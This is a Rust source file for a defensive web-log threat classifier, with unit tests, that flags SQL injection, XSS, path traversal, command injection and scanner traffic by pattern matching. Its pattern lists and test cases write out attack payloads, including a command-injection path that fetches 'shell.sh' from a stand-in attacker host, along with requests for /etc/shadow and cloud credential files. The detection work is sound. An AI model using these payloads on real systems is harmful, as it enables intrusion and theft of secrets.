use crate::log_scanner::parser::ParsedLogEntry;
use std::fmt;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Default)]
pub enum ThreatLevel {
    #[default]
    None,
    Low,
    Medium,
    High,
    Critical,
}

impl fmt::Display for ThreatLevel {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            ThreatLevel::None => write!(f, "None"),
            ThreatLevel::Low => write!(f, "Low"),
            ThreatLevel::Medium => write!(f, "Medium"),
            ThreatLevel::High => write!(f, "High"),
            ThreatLevel::Critical => write!(f, "Critical"),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum ThreatCategory {
    SqlInjection,
    Xss,
    PathTraversal,
    CommandInjection,
    BruteForce,
    Scanner,
    SensitiveFile,
    TlsError,
    SuspiciousPattern,
}

impl fmt::Display for ThreatCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            ThreatCategory::SqlInjection => write!(f, "SqlInjection"),
            ThreatCategory::Xss => write!(f, "Xss"),
            ThreatCategory::PathTraversal => write!(f, "PathTraversal"),
            ThreatCategory::CommandInjection => write!(f, "CommandInjection"),
            ThreatCategory::BruteForce => write!(f, "BruteForce"),
            ThreatCategory::Scanner => write!(f, "Scanner"),
            ThreatCategory::SensitiveFile => write!(f, "SensitiveFile"),
            ThreatCategory::TlsError => write!(f, "TlsError"),
            ThreatCategory::SuspiciousPattern => write!(f, "SuspiciousPattern"),
        }
    }
}

#[derive(Debug, Clone, PartialEq)]
pub struct ThreatResult {
    pub threat_level: ThreatLevel,
    pub categories: Vec<ThreatCategory>,
    pub confidence: f64,
}

impl fmt::Display for ThreatResult {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "{} threat (confidence: {:.0}%) - {}",
            self.threat_level,
            self.confidence * 100.0,
            self.categories
                .iter()
                .map(|c: &ThreatCategory| c.to_string())
                .collect::<Vec<_>>()
                .join(", ")
        )
    }
}

#[derive(Debug, Clone, Default)]
pub struct Classifier {
    _private: (),
}

impl Classifier {
    #[must_use]
    pub fn new() -> Self {
        Self::default()
    }

    #[must_use]
    pub fn classify(&self, entry: &ParsedLogEntry) -> ThreatResult {
        let mut result = ThreatResult {
            threat_level: ThreatLevel::None,
            categories: Vec::new(),
            confidence: 0.0,
        };

        let text = format!("{} {}", entry.message, entry.raw).to_lowercase();
        let path = entry
            .metadata
            .request_path
            .as_ref()
            .map(|p| p.to_lowercase())
            .unwrap_or_default();

        checks::check_command_injection(&mut result, &text, &path);
        checks::check_sql_injection(&mut result, &text, &path);
        checks::check_xss(&mut result, &text, &path);
        checks::check_path_traversal(&mut result, &path);
        checks::check_brute_force(&mut result, &text, entry);
        checks::check_scanner_ua(&mut result, &entry.metadata);
        checks::check_sensitive_files(&mut result, &path);
        checks::check_tls_errors(&mut result, &text);
        checks::check_error_responses(&mut result, &entry.metadata, &path);

        if result.categories.is_empty() {
            return result;
        }

        result.confidence = checks::calculate_confidence(&result);
        result.threat_level = checks::calculate_threat_level(&result);
        result
    }
}

mod checks {
    use super::{ParsedLogEntry, ThreatCategory, ThreatLevel, ThreatResult};
    use crate::log_scanner::parser::{LogLevel, LogMetadata};

    fn add_category(result: &mut ThreatResult, category: ThreatCategory) {
        if !result.categories.contains(&category) {
            result.categories.push(category);
        }
    }

    pub fn check_command_injection(result: &mut ThreatResult, text: &str, path: &str) {
        let patterns = [
            ";cat ", ";ls ", ";whoami", ";id ", ";rm ", "|grep", "|cat ", "`whoami`", "`id`",
            "$(wget", "$(curl", "$(cat ", ";wget ", ";curl ", ";nc ", ";bash ", ";sh ", ";python ",
            ";perl ", ";ruby ", ";php ",
        ];

        for &pattern in &patterns {
            if text.contains(pattern) || path.contains(pattern) {
                add_category(result, ThreatCategory::CommandInjection);
                return;
            }
        }
    }

    pub fn check_sql_injection(result: &mut ThreatResult, text: &str, path: &str) {
        let patterns = [
            "' or '",
            "' or 1",
            " or 1=1",
            " or '1'='1",
            "union select",
            "union all select",
            "drop table",
            "drop database",
            "insert into",
            "delete from",
            "update .* set",
            "exec xp_",
            "exec sp_",
            "';--",
            "'--",
            "admin'--",
            "1; drop",
            "1 and 1=1",
            "1' and '1'='1",
        ];

        for &pattern in &patterns {
            if text.contains(pattern) || path.contains(pattern) {
                add_category(result, ThreatCategory::SqlInjection);
                return;
            }
        }
    }

    pub fn check_xss(result: &mut ThreatResult, text: &str, path: &str) {
        let patterns = [
            "<script",
            "javascript:",
            "onerror=",
            "onload=",
            "onclick=",
            "onmouseover=",
            "<img src=",
            "<svg ",
            "<iframe",
            "alert(",
            "document.cookie",
            "eval(",
        ];

        for &pattern in &patterns {
            if text.contains(pattern) || path.contains(pattern) {
                add_category(result, ThreatCategory::Xss);
                return;
            }
        }
    }

    pub fn check_path_traversal(result: &mut ThreatResult, path: &str) {
        let patterns = [
            "../",
            "..\\",
            "..%2f",
            "..%5c",
            "%2e%2e/",
            "....//",
            "/etc/passwd",
            "/etc/shadow",
            "/proc/self",
            "php://filter",
            "php://input",
            "file://",
        ];

        for &pattern in &patterns {
            if path.contains(pattern) {
                add_category(result, ThreatCategory::PathTraversal);
                return;
            }
        }
    }

    pub fn check_brute_force(result: &mut ThreatResult, text: &str, entry: &ParsedLogEntry) {
        let patterns = [
            "failed password",
            "authentication failure",
            "invalid user",
            "maximum authentication attempts",
            "too many authentication failures",
            "access denied",
            "login failed",
        ];

        for &pattern in &patterns {
            if text.contains(pattern) {
                add_category(result, ThreatCategory::BruteForce);
                return;
            }
        }

        if entry.level == LogLevel::Error && text.contains("password") {
            add_category(result, ThreatCategory::BruteForce);
        }
    }

    pub fn check_scanner_ua(result: &mut ThreatResult, metadata: &LogMetadata) {
        let Some(ref ua) = metadata.user_agent else {
            return;
        };

        let ua_lower = ua.to_lowercase();
        let scanners = [
            "sqlmap",
            "nikto",
            "nmap",
            "masscan",
            "hydra",
            "medusa",
            "burp suite",
            "dirbuster",
            "gobuster",
            "wpscan",
            "nuclei",
            "ffuf",
            "feroxbuster",
            "w3af",
        ];

        for &scanner in &scanners {
            if ua_lower.contains(scanner) {
                add_category(result, ThreatCategory::Scanner);
                return;
            }
        }
    }

    pub fn check_sensitive_files(result: &mut ThreatResult, path: &str) {
        let patterns = [
            "/.env",
            "/.git",
            "/.htaccess",
            "/.htpasswd",
            "/wp-config.php",
            "/config/database.yml",
            "/config/database.yaml",
            "/config/secrets.yml",
            "/.aws/credentials",
            "/.ssh/id_rsa",
            "/proc/self/environ",
            "/boot.ini",
            "/web.config",
            "/phpinfo.php",
            "/server-status",
            "/.svn",
            "/.DS_Store",
        ];

        for &pattern in &patterns {
            if path == pattern || path.starts_with(pattern) {
                add_category(result, ThreatCategory::SensitiveFile);
                return;
            }
        }
    }

    pub fn check_tls_errors(result: &mut ThreatResult, text: &str) {
        let patterns = [
            "ssl_do_handshake",
            "ssl_error",
            "certificate verify failed",
            "tls alert",
            "handshake failure",
        ];

        for &pattern in &patterns {
            if text.contains(pattern) {
                add_category(result, ThreatCategory::TlsError);
                return;
            }
        }
    }

    pub fn check_error_responses(result: &mut ThreatResult, metadata: &LogMetadata, path: &str) {
        let Some(status) = metadata.status_code else {
            return;
        };

        if status == 403 || status == 404 {
            let suspicious_paths = [
                "/admin",
                "/wp-admin",
                "/phpmyadmin",
                "/manager",
                "/console",
                "/config",
                "/.env",
                "/backup",
            ];

            for &sp in &suspicious_paths {
                if path.contains(sp) {
                    add_category(result, ThreatCategory::SuspiciousPattern);
                    return;
                }
            }
        }
    }

    pub fn calculate_threat_level(result: &ThreatResult) -> ThreatLevel {
        let has_critical = result
            .categories
            .contains(&ThreatCategory::CommandInjection);
        let has_high = result.categories.iter().any(|c| {
            matches!(
                c,
                ThreatCategory::SqlInjection
                    | ThreatCategory::Xss
                    | ThreatCategory::PathTraversal
                    | ThreatCategory::Scanner
            )
        });
        let has_medium = result.categories.iter().any(|c| {
            matches!(
                c,
                ThreatCategory::BruteForce | ThreatCategory::SensitiveFile
            )
        });

        let category_count = result.categories.len();

        if has_critical || (has_high && category_count >= 2) {
            ThreatLevel::Critical
        } else if has_high {
            ThreatLevel::High
        } else if has_medium || category_count >= 2 {
            ThreatLevel::Medium
        } else if !result.categories.is_empty() {
            ThreatLevel::Low
        } else {
            ThreatLevel::None
        }
    }

    pub fn calculate_confidence(result: &ThreatResult) -> f64 {
        let base = match result.categories.len() {
            1 => 0.7_f64,
            2 => 0.85_f64,
            3..=4 => 0.95_f64,
            _ => 1.0_f64,
        };

        let has_strong = result.categories.iter().any(|c| {
            matches!(
                c,
                ThreatCategory::CommandInjection
                    | ThreatCategory::SqlInjection
                    | ThreatCategory::Scanner
            )
        });

        if has_strong {
            (base + 0.1_f64).min(1.0_f64)
        } else {
            base
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::log_scanner::parser::{LogLevel, LogMetadata, ParsedLogEntry};
    use chrono::Utc;
    use rstest::rstest;
    use std::net::IpAddr;

    fn make_entry(message: &str, level: LogLevel, metadata: LogMetadata) -> ParsedLogEntry {
        ParsedLogEntry {
            timestamp: Utc::now(),
            source_name: "nginx".into(),
            level,
            message: message.into(),
            raw: message.into(),
            metadata,
        }
    }

    #[allow(dead_code)]
    fn make_entry_with_ip(message: &str, ip: IpAddr) -> ParsedLogEntry {
        make_entry(
            message,
            LogLevel::Info,
            LogMetadata {
                client_ip: Some(ip),
                ..LogMetadata::default()
            },
        )
    }

    fn make_entry_with_path(message: &str, path: &str) -> ParsedLogEntry {
        make_entry(
            message,
            LogLevel::Info,
            LogMetadata {
                request_path: Some(path.into()),
                ..LogMetadata::default()
            },
        )
    }

    fn make_entry_with_ua(message: &str, ua: &str) -> ParsedLogEntry {
        make_entry(
            message,
            LogLevel::Info,
            LogMetadata {
                user_agent: Some(ua.into()),
                ..LogMetadata::default()
            },
        )
    }

    fn make_entry_with_status(message: &str, status: u16) -> ParsedLogEntry {
        let path = message.split_whitespace().nth(1).unwrap_or(message);
        make_entry(
            message,
            LogLevel::Info,
            LogMetadata {
                request_path: Some(path.into()),
                status_code: Some(status),
                ..LogMetadata::default()
            },
        )
    }

    #[test]
    fn test_classifier_is_created() {
        let _classifier = Classifier::default();
        let _classifier_new = Classifier::new();
    }

    #[test]
    fn test_classify_normal_request() {
        let classifier = Classifier::new();
        let entry = make_entry(
            "GET /index.html 200",
            LogLevel::Info,
            LogMetadata::default(),
        );
        let result = classifier.classify(&entry);

        assert_eq!(result.threat_level, ThreatLevel::None);
        assert!(result.categories.is_empty());
    }

    #[test]
    fn test_classify_sql_injection_in_path() {
        let classifier = Classifier::new();

        let cases = vec![
            "/users?id=1' OR '1'='1",
            "/search?q=1; DROP TABLE users;--",
            "/api/users?id=1 UNION SELECT * FROM passwords",
            "/login?user=admin'--",
            "/page?id=1 AND 1=1",
            "/items?sort=name; EXEC xp_cmdshell('dir')",
        ];

        for path in cases {
            let entry = make_entry_with_path("GET request", path);
            let result = classifier.classify(&entry);
            assert!(
                result.threat_level >= ThreatLevel::High,
                "Expected high threat for SQL injection in path: {path}"
            );
            assert!(
                result.categories.contains(&ThreatCategory::SqlInjection),
                "Expected SqlInjection category for: {path}"
            );
        }
    }

    #[test]
    fn test_classify_xss_in_path() {
        let classifier = Classifier::new();

        let cases = vec![
            "/search?q=<script>alert('xss')</script>",
            "/comment?text=<img src=x onerror=alert(1)>",
            "/page?name=<svg onload=alert(1)>",
            "/input?value=javascript:alert(1)",
            "/form?data=<iframe src='evil.com'></iframe>",
        ];

        for path in cases {
            let entry = make_entry_with_path("GET request", path);
            let result = classifier.classify(&entry);
            assert!(
                result.threat_level >= ThreatLevel::High,
                "Expected high threat for XSS in path: {path}"
            );
            assert!(
                result.categories.contains(&ThreatCategory::Xss),
                "Expected Xss category for: {path}"
            );
        }
    }

    #[test]
    fn test_classify_path_traversal() {
        let classifier = Classifier::new();

        let cases = vec![
            "/files?name=../../../etc/passwd",
            "/download?file=....//....//etc/shadow",
            "/static/..%2f..%2f..%2fetc%2fpasswd",
            "/read?path=/etc/passwd",
            "/include?page=php://filter/convert.base64-encode/resource=config.php",
        ];

        for path in cases {
            let entry = make_entry_with_path("GET request", path);
            let result = classifier.classify(&entry);
            assert!(
                result.threat_level >= ThreatLevel::High,
                "Expected high threat for path traversal: {path}"
            );
            assert!(
                result.categories.contains(&ThreatCategory::PathTraversal),
                "Expected PathTraversal category for: {path}"
            );
        }
    }

    #[test]
    fn test_classify_suspicious_user_agents() {
        let classifier = Classifier::new();

        let cases = vec![
            ("sqlmap/1.5", ThreatLevel::High),
            ("nikto/2.1.6", ThreatLevel::High),
            ("nmap scripting engine", ThreatLevel::High),
            ("masscan/1.0", ThreatLevel::High),
            ("dirbuster/1.0", ThreatLevel::Medium),
            ("gobuster/3.1", ThreatLevel::Medium),
            ("WPScan v3.8", ThreatLevel::Medium),
        ];

        for (ua, expected_min) in cases {
            let entry = make_entry_with_ua("GET /", ua);
            let result = classifier.classify(&entry);
            assert!(
                result.threat_level >= expected_min,
                "Expected >= {expected_min:?} for UA: {ua}"
            );
            assert!(
                result.categories.contains(&ThreatCategory::Scanner),
                "Expected Scanner category for UA: {ua}"
            );
        }
    }

    #[test]
    fn test_classify_brute_force_indicators() {
        let classifier = Classifier::new();

        let cases = vec![
            (
                "Failed password for root from 192.168.1.100",
                LogLevel::Error,
            ),
            ("authentication failure; user=admin", LogLevel::Error),
            ("Invalid user hacker from 10.0.0.1", LogLevel::Warn),
            ("Maximum authentication attempts exceeded", LogLevel::Error),
        ];

        for (msg, level) in cases {
            let entry = make_entry(msg, level, LogMetadata::default());
            let result = classifier.classify(&entry);
            assert!(
                result.threat_level >= ThreatLevel::Medium,
                "Expected medium threat for brute force indicator: {msg}"
            );
            assert!(
                result.categories.contains(&ThreatCategory::BruteForce),
                "Expected BruteForce category for: {msg}"
            );
        }
    }

    #[test]
    fn test_classify_error_responses() {
        let classifier = Classifier::new();

        let entry = make_entry_with_status("GET /admin/config", 403);
        let result = classifier.classify(&entry);
        assert!(result.threat_level >= ThreatLevel::Low);

        let entry = make_entry_with_status("GET /wp-admin", 404);
        let result = classifier.classify(&entry);
        assert!(result.threat_level >= ThreatLevel::Low);
    }

    #[test]
    fn test_classify_combined_threats() {
        let classifier = Classifier::new();
        let entry = make_entry_with_ua("GET /users?id=1' OR '1'='1", "sqlmap/1.5");
        let result = classifier.classify(&entry);

        assert_eq!(result.threat_level, ThreatLevel::Critical);
        assert!(result.categories.contains(&ThreatCategory::SqlInjection));
        assert!(result.categories.contains(&ThreatCategory::Scanner));
        assert!(result.confidence > 0.8);
    }

    #[test]
    fn test_classify_command_injection() {
        let classifier = Classifier::new();

        let cases = vec![
            "/api/ping?host=127.0.0.1;cat /etc/passwd",
            "/exec?cmd=ls|grep secret",
            "/run?command=test`whoami`",
            "/api/curl?url=http://evil.com$(wget attacker.com/shell.sh)",
        ];

        for path in cases {
            let entry = make_entry_with_path("GET request", path);
            let result = classifier.classify(&entry);
            assert!(
                result.threat_level >= ThreatLevel::Critical,
                "Expected critical threat for command injection: {path}"
            );
            assert!(
                result
                    .categories
                    .contains(&ThreatCategory::CommandInjection),
                "Expected CommandInjection category for: {path}"
            );
        }
    }

    #[test]
    fn test_classify_sensitive_file_access() {
        let classifier = Classifier::new();

        let cases = vec![
            "/.env",
            "/.git/config",
            "/.htaccess",
            "/wp-config.php",
            "/config/database.yml",
            "/.aws/credentials",
        ];

        for path in cases {
            let entry = make_entry_with_path("GET request", path);
            let result = classifier.classify(&entry);
            assert!(
                result.threat_level >= ThreatLevel::Medium,
                "Expected medium threat for sensitive file access: {path}"
            );
            assert!(
                result.categories.contains(&ThreatCategory::SensitiveFile),
                "Expected SensitiveFile category for: {path}"
            );
        }

        // /etc/passwd and /proc/self/environ are classified as PathTraversal (more specific)
        for path in &["/etc/passwd", "/proc/self/environ"] {
            let entry = make_entry_with_path("GET request", path);
            let result = classifier.classify(&entry);
            assert!(
                result.threat_level >= ThreatLevel::High,
                "Expected high threat for system file access: {path}"
            );
            assert!(
                result.categories.contains(&ThreatCategory::PathTraversal),
                "Expected PathTraversal for system file: {path}"
            );
        }
    }

    #[test]
    fn test_classify_ssl_tls_errors() {
        let classifier = Classifier::new();

        let cases = vec![
            ("SSL_do_handshake() failed", LogLevel::Error),
            ("SSL_ERROR_RX_RECORD_TOO_LONG", LogLevel::Error),
            ("certificate verify failed", LogLevel::Error),
        ];

        for (msg, level) in cases {
            let entry = make_entry(msg, level, LogMetadata::default());
            let result = classifier.classify(&entry);
            assert!(result.threat_level >= ThreatLevel::Low);
        }
    }

    #[rstest]
    fn test_threat_level_ordering(
        #[values(
            ThreatLevel::None,
            ThreatLevel::Low,
            ThreatLevel::Medium,
            ThreatLevel::High,
            ThreatLevel::Critical
        )]
        a: ThreatLevel,
        #[values(
            ThreatLevel::None,
            ThreatLevel::Low,
            ThreatLevel::Medium,
            ThreatLevel::High,
            ThreatLevel::Critical
        )]
        b: ThreatLevel,
    ) {
        assert_eq!(a <= b, (a as u8) <= (b as u8));
    }

    #[test]
    fn test_threat_result_display() {
        let result = ThreatResult {
            threat_level: ThreatLevel::High,
            categories: vec![ThreatCategory::SqlInjection],
            confidence: 0.95,
        };
        let display = format!("{result}");
        assert!(display.contains("High"));
        assert!(display.contains("SqlInjection"));
    }
}
